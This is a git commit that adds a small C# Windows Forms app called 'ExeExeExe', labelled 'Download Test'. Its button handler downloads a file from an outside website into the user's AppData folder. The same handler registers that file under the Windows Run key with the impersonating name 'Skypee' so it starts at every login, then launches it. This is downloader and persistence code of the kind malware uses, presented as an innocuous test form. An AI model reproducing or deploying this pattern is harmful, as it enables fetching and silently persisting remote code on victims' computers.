3cbd18d68c53c942dbec9e6d15e2f9396928a31c
Samed Karakus <karakusnavy@gmail.com>
2019-07-04 15:05:59 +0300

    up

---
+++ ExeExeExe/Form1.Designer.cs
@@ -0,0 +1,65 @@
+﻿namespace ExeExeExe
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.button1 = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(182, 147);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 30);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Click Me";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 17F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.White;
+            this.ClientSize = new System.Drawing.Size(433, 318);
+            this.Controls.Add(this.button1);
+            this.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
+            this.Name = "Form1";
+            this.Text = "Download Test";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+    }
+}
+
---
+++ ExeExeExe/Form1.cs
@@ -0,0 +1,57 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text;
+using Microsoft.Win32;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using IWshRuntimeLibrary;
+
+namespace ExeExeExe
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        string startMenuPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+        private void button1_Click(object sender, EventArgs e)
+        {
+            download("https://kalitelimedya.com/baba.html", appData + "/deneme2.html",appData + "/deneme2.html");
+        }
+        void download(string downloadlink, string downloadtargetpath, string shortcuttargetpath)
+        {
+           
+
+            WebClient wc = new WebClient();
+            wc.DownloadFileAsync(new Uri(downloadlink), downloadtargetpath);
+            string ProgramAdi = "Skypee";
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+            key.SetValue(ProgramAdi, shortcuttargetpath);
+            Process.Start(shortcuttargetpath);
+        }
+
+        private void Abc_Tick(object sender, EventArgs e)
+        {
+            
+        }
+        List<String> linkler = new List<string>();
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            System.Windows.Forms.Timer abc = new System.Windows.Forms.Timer();
+            abc.Interval = 5000;
+            abc.Tick += Abc_Tick;
+            abc.Start();
+
+        }
+    }
+}
